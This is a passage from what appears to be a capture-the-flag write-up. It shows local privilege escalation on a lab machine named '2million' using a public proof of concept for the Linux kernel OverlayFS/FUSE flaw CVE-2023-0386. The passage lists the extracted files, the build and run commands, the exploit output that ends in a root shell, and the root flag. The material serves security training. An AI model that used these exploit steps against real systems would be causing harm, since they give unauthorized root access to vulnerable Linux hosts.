  inflating: CVE-2023-0386/.git/hooks/commit-msg.sample
  inflating: CVE-2023-0386/.git/hooks/pre-commit.sample
  inflating: CVE-2023-0386/.git/hooks/sendemail-validate.sample
  inflating: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample
  inflating: CVE-2023-0386/.git/hooks/pre-rebase.sample
  inflating: CVE-2023-0386/.git/hooks/pre-receive.sample
  inflating: CVE-2023-0386/.git/hooks/pre-applypatch.sample
  inflating: CVE-2023-0386/.git/hooks/update.sample
  inflating: CVE-2023-0386/.git/hooks/post-update.sample
  inflating: CVE-2023-0386/.git/hooks/applypatch-msg.sample
  inflating: CVE-2023-0386/.git/hooks/pre-push.sample
  inflating: CVE-2023-0386/exp.c
 extracting: CVE-2023-0386/ovlcap/.gitkeep
  inflating: CVE-2023-0386/Makefile
  inflating: CVE-2023-0386/fuse.c
  inflating: CVE-2023-0386/test/mnt
  inflating: CVE-2023-0386/test/fuse_test.c
  inflating: CVE-2023-0386/test/mnt.c
admin@2million:~$ ls
CVE-2023-0386  cve.zip  user.txt
admin@2million:~$ cd CVE-2023-0386/
admin@2million:~/CVE-2023-0386$ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
admin@2million:~/CVE-2023-0386$ make all
```

```bash
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0

[+] getattr_callback
/
[+] getattr_callback
/
[+] readdir
[+] getattr_callback
/
[+] readdir
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

Now while its running in another SSH tab.

```bash
admin@2million:~$ cd CVE-2023-0386/
admin@2million:~/CVE-2023-0386$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct 17 09:19 .
drwxr-xr-x 6 root   root     4096 Oct 17 09:19 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt
fadfc1816a6961caa36589ef27e7083f
```

---
